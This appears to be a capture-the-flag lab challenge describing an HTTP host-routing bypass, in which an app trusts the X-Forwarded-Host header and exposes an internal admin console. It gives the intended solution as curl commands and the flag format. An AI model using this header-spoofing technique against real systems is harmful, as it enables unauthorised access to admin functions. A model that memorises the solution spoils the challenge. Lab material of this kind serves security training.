# http/host-routing-bypass — HostRoutingBypass (location-locked, medium)

**Edge Node Console** — a public status page on `victim.target.lab`. The same app also contains an internal **admin console** meant for the internal vhost `admin-internal.target.lab` — a host the lab edge does **not** route to the app (it falls into the catch-all `*.target.lab` → attacker space), so the console is unroutable by design.
**Bug:** the app decides which vhost it is serving from the *effective host* and trusts `X-Forwarded-Host` when present (its "edge proxy always sets it" assumption). A plain request to the **victim** vhost carrying `X-Forwarded-Host: admin-internal.target.lab` activates the admin routes.

## Intended path
1. See the unroutable host: `curl -H "Host: admin-internal.target.lab:8119" http://127.0.0.1:8119/admin/panel` → you land in **attacker space** (catch-all), not the app. Also `curl http://victim.target.lab:8119/admin/panel` → 404 ("no admin console on the public vhost").
2. Bypass: `curl -H "X-Forwarded-Host: admin-internal.target.lab" http://victim.target.lab:8119/admin/panel` → the app believes it is serving the internal vhost and returns the flag from the admin panel (the location is the lock — server-side effective-host check).

**Flag:** `DSLTV{HTTP-HostRoutingBypass-<9 digits>}` (only from `/admin/panel` under the bypassed host).
